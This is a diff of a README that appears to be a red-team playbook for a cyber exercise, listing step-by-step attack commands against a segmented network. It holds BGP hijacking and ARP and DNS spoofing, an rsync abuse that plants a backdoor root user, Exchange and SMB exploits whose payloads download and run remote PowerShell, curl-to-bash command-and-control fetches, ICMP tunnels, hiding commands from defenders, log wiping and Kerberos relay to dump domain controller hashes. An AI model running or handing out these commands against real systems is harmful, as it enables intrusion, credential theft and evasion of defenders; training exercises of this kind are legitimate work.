@@ -1,6 +1,5 @@
 # CS2020 repository
 
-#### MSEL concepts:
 ###### GROUPS
 ```txt
 # initial entry 
@@ -126,24 +125,129 @@ proxy (icmp?)
 
 ```
 
-###### GROUP 2
+###### BGP HIJACK
 ```txt
+# bgp prefix hijack scenario e.g. preferred 65.x.101.0/25 over /24
+# requires: https://github.com/Quagga/quagga
+# 1. dmz 65.x.101.0/24 (proxy, ftp, dns, web-conf)  
+# 2. zone 2a 65.x.102.0/25  (dc's, dhcp, sql, sp, web and dev)
+# 3. zone 2b 65.x.102.0/25  (file, admin tools, mcafee, vuln, ?..)
+# 4. zone 3 65.x.103.0/24  (workstations lin and win, printers)
+# 5. zone 4a 65.x.104.0/24  (workstations, hmi, hist)
+# 6. zone 4b 10.1.104.0/24  (plcs, slaves, scada)
+# 7. greyspace 65.x.1.0/31 (dns, sites, opfor)
+
+# fingerprinting for bgp, port 179   
+proxychains nmap -oA dmz_fingerprinting -sT -sV --open -p873,21,22,23,53,80,179,443,873,8009,8080,8443,3306 <NETWORK/CIDR> 
+proxychains nmap -oA dmz_udp_fingerprinting -sU -sV --open -p67,68,69,161,162,1194 <NETWORK/CIDR>
+
+# vim /etc/quagga/daemons
+zebra=yes
+bgpd=no
+ospfd=no
+ospf6d=no
+ripd=no
+ripngd=no
+
+# enable daemon
+/etc/init.d/quagga start
+
+# enable packet forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
+
+# create overlapping bgp routes (dmz example)
+vtysh
+show ip route bgp
+conf t
+router bgp 100
+network 65.x.101.0/25
+network 65.x.101.128/25
+end
+write mem
+
+# virtual interface and static routes to intercept traffic (single box)
+ifconfig lo:1 65.x.101.x/25
+ip route add 65.x.101.x/32 via 0.0.0.0 dev lo:1
+
+# mitm dns or ftp or ssh?
+# use hijacked ip to bypass pfsense?
+
+# restore traffic locally 
+ifconfig lo:1 127.0.0.2
+ip route del 65.x.101.x dev lo
+ip route add 65.x.101.x/24 via 65.x.x.x dev ethx
+
+# disable daemon
+/etc/init.d/quagga stop
 ```
 
-#### MSEL concepts:
-###### DMZ
+###### ALTERNATIVE MITM
 ```txt
-# initial access firewall cve (out of scope?)
-python3 pfsense_auth_2.2.6_exec.py localhost:65535 nc <IP>
+# enable packet forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
 
-# initial access firewall (lockout feature!) web-proxy, ftp, dns, and web-conf 
-proxychains hydra -L ~/users.txt -P ~/passwords.txt <IP> ssh -u -V;
+# dns cache poison external dns (out of scope?)
+proxychains python3 poison.py <DNSIP> <FQDN> <ATTACKIP>
 
-# shell to dmz boxes via ssh 
-ssh <USER>@<IP>
+# arp spoof external dns, wpad.prestige1.com (out of scope?)
+iptables -F;
+iptables -t nat -F;
+iptables -X;
+iptables -t nat -A PREROUTING -p tcp -d <TARGETSERVER> --dport <PORT> -j DNAT --to-destination <ATTACKERIP>:<PORT>;
+arpspoof -i eth0 -t <DNSIP> <GATEWAY>;
+
+# ipv6 for ipv4 (dhcp in greyspace out of scope?)
+mitm6.py -d <DOMAIN> -hw <TARGET>
 ```
 
-###### GREYZONE
+###### INTERNAL / EXTERNAL RSYNC EXPLOIT
+```txt
+# fingerprinting for rsync, port 873 (udp with proxychains?)   
+proxychains nmap -oA dmz_fingerprinting -sT -sV --open -p873,21,22,23,53,80,179,443,873,8009,8080,8443,3306 <NETWORK/CIDR> 
+proxychains nmap -oA dmz_udp_fingerprinting -sU -sV --open -p67,68,69,161,162,1194 <NETWORK/CIDR>
+
+# example rsync, list directory and files 
+proxychains rsync <IP>::
+proxychains rsync <IP>::files
+proxychains rsync -r <IP>::files/home/
+
+# rsync download shadow file and user folders
+proxychains rsync <IP>::files/etc/shadow .
+proxychains rsync -r <IP>::files/home/admin/
+
+# create new user, upload folder
+mkdir ./pwn
+proxychains rsync -r ./pwn <IP>::files/home/
+
+# generate password for shadow, append it to downloaded shadow
+openssl passwd -crypt password123
+echo "pwn:MjHKz4C0Z0VCI:17861:0:99999:7:::" >> ./shadow
+
+# rsync upload shadow with updated user
+proxychains rsync ./shadow <IP>::files/etc/
+
+# download, update, upload passwd file 
+rsync -R <IP>::files/etc/passwd .
+echo "pwn:x:1021:1021::/home/pwn:/bin/bash" >> ./passwd
+rsync ./passwd <IP>::files/etc/
+
+# download, update, upload group file
+rsync -R <IP>::files/etc/group .
+echo "pwn:x:1021:" >> ./group
+rsync ./group <IP>::files/etc/
+
+# download, update, upload sudoer file
+rsync -R <IP>::files/etc/sudoers .
+echo "pwn ALL=(ALL) NOPASSWD:ALL" >> ./sudoers   
+rsync ./sudoers <IP>::files/etc/
+
+# connect via ssh
+ssh pwn@<IP>
+```
+
+###### INTERNAL EXCHANGE EXPLOIT
 ```txt
 # initial access via owa365/exchange, spray for access (or phish for NTLM hashes?)
 proxychains ruler --domain <TARGET> --insecure brute --users ~/users.txt --passwords ~/passwords.txt --delay 0 --verbose
@@ -159,10 +263,9 @@ proxychains exchange_scanner_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD
 
 # shell via oneliner
 proxychains exchange_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> -c CMD "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('http://<URL>/c2_icmp_shell.ps1'))"
-
 ```
 
-###### EXTERNAL .NET SITE
+###### EXTERNAL / INTERNAL .NET EXPLOIT
 ```txt
 # grab viewstate info
 curl -sv http:<URL>/Content/Default.aspx 2>&1|egrep "__VIEWSTATE|__VIEWSTATEENCRYPTED|__VIEWSTATEGENERATOR|__EVENTVALIDATION" > viewstate.txt &
@@ -201,10 +304,23 @@ curl -sv 'http://<URL>/Content/default.aspx' \
 
 ###### ACTIONS ON LINUX PENETRATION
 ```txt
-# on penetration, backup C2 and proxy
+# http C2
 nohup curl --insecure -sv https://<IP>/c2_http_basic_server.py|python - & disown
+nohup wget --no-check-certificate -q -O - https://<IP>/pwn.sh | bash & disown
+# icmp C2
+sysctl -w net.ipv4.icmp_echo_ignore_all=1
+curl --insecure https://<IP>/icmp_basic_server -o c2_icmp_basic_server && chmod +x c2_icmp_basic_server
+
+# proxying traffic, socks
 nohup curl --insecure -sv https://<IP>/c2_python_proxy_server.py|python - & disown
 ssh -f -N -D <IP>:65535 root@localhost
+# proxying traffic, icmp to socks
+echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
+nohup curl --insecure -sv https://<IP>/IcmpTunnel_S.py|python - & disown
+# local icmp tunnel
+python IcmpTunnel_C.py <IP> <TARGETIP> <TARGETPORT>
+# proxying traffic, http  
+python regeorge-v2.py -l <LOCALIP> -p <LPORT> -u http://<IP>/tunnel.php
 
 # edit proxychains.conf
 localnet 127.0.0.0/255.0.0.0
@@ -216,29 +332,36 @@ adduser <c2_NAME>
 usermod -aG sudo <c2_NAME>
 ssh-keygen -t rsa
 
-# proxy via icmp
-echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
-nohup curl --insecure -sv https://<IP>/IcmpTunnel_S.py|python - & disown
-# local icmp tunnel
-python IcmpTunnel_C.py <IP> <TARGETIP> <TARGETPORT>
+# post exploitation, fileless
+curl --insecure -sv https://<IP>/rg-nodialog.sh| bash -
+info
+checkVM
+escalate
+sudowrap
+lswrap
+keyinject
+cron
+systimer
+banip
+clearlog
 
-# icmp elf shell
-sysctl -w net.ipv4.icmp_echo_ignore_all=1
-curl --insecure https://<IP>/icmp_basic_server -o c2_icmp_basic_server && chmod +x c2_icmp_basic_server
+# post exploitation, on disk 
+curl --insecure -sv https://<IP>/redghost.sh -o redghost.sh && chmod +x redghost.sh 
+MassInfoGrab
+SudoInject
+LsInject
+SSHKeyInject
+# persistence
+Crontab
+SysTimer
+# BanIP <BLUETEAMIP> # (out of scope?) 
 
-# post exploitation
-curl --insecure -sv https://<IP>/redghost.sh| bash -
-mkdir /bin/.usr/ && cd /bin/.usr/ && curl --insecure https://<IP>/bash_hide.sh -o c2_bash_hide.sh && chmod +x c2_bash_hide.sh
-
-# edit c2_bash_hide.sh
-THINGTOHIDE=c2
-
-# edit ~/.bashrc's
-PATH=/bin/.usr/:${PATH}
-# file located in first path /bin/.usr/c2_bash_hide.sh 
-for f in "netstat" "iptables" "kill" "ps" "pgrep" "pkill" "ls" "rm" "rmdir" "passwd" "shutdown" "chmod" "sudo" "su" "cat" "useradd" "id" "ln" "unlink" "which" "gpasswd" "bash" "sh" "env" "echo" "history" "tcpdump" "chattr" "lsattr" "export" "mv" "grep" "egrep" "find"; do 
-	ln -s /bin/.usr/c2_bash_hide.sh /bin/.usr/${f};
-done;
+# hide commands via path preference
+curl --insecure -sv https://<IP>/bash_hide.sh -o c2_bash_hide.sh && chmod +x c2_bash_hide.sh
+# hide from bash commands
+# edit ~/.bashrc's:
+# PATH=/bin/.usr/:${PATH}
+. ./c2_bash_hide.sh && setupPwn
 
 # lock files, keep password, encrypt 
 for f in "~/.bashrc" "/bin/.usr/c2_bash_hide.sh"  "/etc/shadow" "/etc/group" "/etc/sudoers" "/root/.ssh/id_rsa*" "/<c2_NAME>/.ssh/id_rsa*"; do 
@@ -255,6 +378,7 @@ for f in `find / -type f -name "*" 2>/dev/null`; do
 done;
 history -c && echo "" > ~/.bash_history
 ```
+
 ###### ACTIONS ON WINDOWS PENETRATION
 ```txt
 # on penetration
@@ -309,6 +433,40 @@ Invoke-PowerDump
 
 # clear logs
 foreach($log in (get-eventlog -list|foreach-object {$_.log})){clear-eventlog -logname $_;}
+
+# disable and redirect rdp on dc1 (out of scope?)
+DisableRDP
+netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=<TARGETPORT> connectaddress=<ATTACKERTIP>
+```
+
+###### DOMAIN ESCALATION
+```txt
+# find unconstrained delegation objects (computer scenario, sql)
+proxychains findDelegation.py -no-pass -hashes <HASHES> -target-domain <DOMAIN> <DOMAIN/USERNAME>;
+
+# dump machine NTLM hashes and aes256 key
+proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;
+
+# add spn via dns (SPN = HOST/PWN-<FQDNOFMACHINE>)
+proxychains addspn.py -u <DOMAIN\\USER> -p <PASSWORDORHASHES> -s <SPN> --additional ldap://<DCFQDN>;
+
+# add dns via adidns 
+proxychains dnstool.py -u <DOMAIN}\\USER> -p <PASSWORDORHASHES> -r <SPN> -a add -d <ATTACKERIPADDRESS> <DCFQDN>;
+
+# setup relay to get ticket
+python krbrelayx.py -aesKey <AES256HASH>
+
+# verify print spool on target dc
+proxychains rpcdump.py -port 135 <TARGETDCFQDN>|grep "MS-RPRN";
+
+# trigger print spool (SPN you created)
+proxychains printerbug.py -hashes <HASHES> <DOMAIN/USER>@<DCFQDN> <SPN>
+
+# export ccache to use for ptt
+export KRB5CCNAME=<CACHEOFTGT>
+
+# dump dc using tgt (use domain admin ntlm hash etc...)
+proxychains secretsdump.py -outputfile <DCFQDN>_hashes -k <DCFQDN> -just-dc;
 ```
 
 ###### LATERAL MOVEMENT
@@ -320,7 +478,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObj
 cmstp.exe /ni /s https://<URL>/shell.inf
 regsvr32 /s /u /i:https://<URL>/shell.sct scrobj.dll
 rundll32 \\<IP>\<SHARE>\Powershdll.dll,main [system.text.encoding]::default.getstring([system.convert]::frombase64string("base64"))^|iex
-rundll32 p:\PowerShdll.dll,main . { iwr -useb https://<URL>/shell.ps1 }^|iex;
+rundll32 p:\PowerShdll.dll,main . { iwr -user https://<URL>/shell.ps1 }^|iex;
 InstallUtil.exe /logfile= /LogToConsole=false /U PowerShdll.dll
 regsvcs.exe PowerShdll.dll
 regasm.exe /U PowerShdll.dll
@@ -328,6 +486,7 @@ netsh.exe add helper p:\PowerShdll.dll
 wget -q -O - http://<IP>/shell.py|python -
 curl -s http://<IP>/shell.py|sudo python -
 curl -sv --insecure https://<IP>/shell.sh|bash -
+xp_cmdshell "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
 
 # ongoing access
 proxychains wmiexec.py -nooutput -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP> "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))";
@@ -336,6 +495,7 @@ proxychains wmiexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
 proxychains dcomexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
 proxychains atexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
 proxychains smbexec.py -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<IP>;
+proxychains mssqlclient.py -windows-auth -port <PORT> -db <DB> -no-pass -hashes :<NTLMHASH> <DOMAIN>/<USER>@<DBIP>;
 proxychains secretsdump.py -no-pass -hashes :<NTLMHASH> -outputfile <IP>_secrets.txt <DOMAIN>/<USER>@<IP>;
 
 # windows traffic redirection
@@ -351,14 +511,10 @@ socat TCP-LISTEN:<PORT>,bind=<IP>,fork,reuseaddr TCP:<TARGETIP>:<TARGETPORT>
 ssh -f -N -D <IP>:<PORT> root@<GATEWAYIP>
 socat TCP4-LISTEN:445,fork,bind=<IP> SOCKS4:<PROXYIP>:<TARGETIP>:<TARGETPORT>,socksport=<PORT>
 
-# host discovery 
+# host discovery andfingerprinting services (icmp proxy?)
 proxychains nmap -oA NETWORK_ping_sweep -v -T 3 -PP --data "\x41\x41" -n -sn <NETWORK/CIDR>
-
-# fingerprinting services
 proxychains nmap -v -T 5 -Pn -sT -sC -sV -oA NETWORK_service_fiingerprint_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>
 proxychains nmap -v --script http-headers -T 3 --open -p80,443 -oA NETWORK_http_header_scan -iL <IPLIST>
-
-# fingerprinting services intrusive/loud
 proxychains nmap -v -T 5 -Pn -sT --max-rate 100 --min-rtt-timeout 100ms --max-rtt-timeout 100ms --initial-rtt-timeout 100ms --max-retries 0 -oA NETWORK_FAST_service_scan --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433,1961,1962 <NETWORK/CIDR>
 
 # domain enumeration via host, using bloodhound
@@ -388,7 +544,7 @@ net use p: \\<IP>\<SHARE>
 net use p: http:\\<WEBDAVURL>
 net use p: /delete
 
-# enumerating shares via host, powershell
+# enumerating shares via host for creds and machineKey, powershell
 gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/appSettings/add")}
 gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/connectionStrings/add")}
 gci -file -filter *.config -recurse -path x:\ |%{([xml](gc $_.fullname)).selectnodes("/configuration/system.web/machineKey")}
@@ -421,5 +577,4 @@ proxychains python3 smbghost_cve-2020-0796.py <TARGETIP> <REVERSEIP> <REVERSEPOR
 # legacy smb exploits
 proxychains python checker.py <IP>
 proxychains python ms17-010.py -target <IP> -pipe_name samr -command "cmd /c powershell -exec bypass -c iex (new-object system.net.webclient).downloadstring('https://<URL>/implant_auth.ps1')"
-
 ```
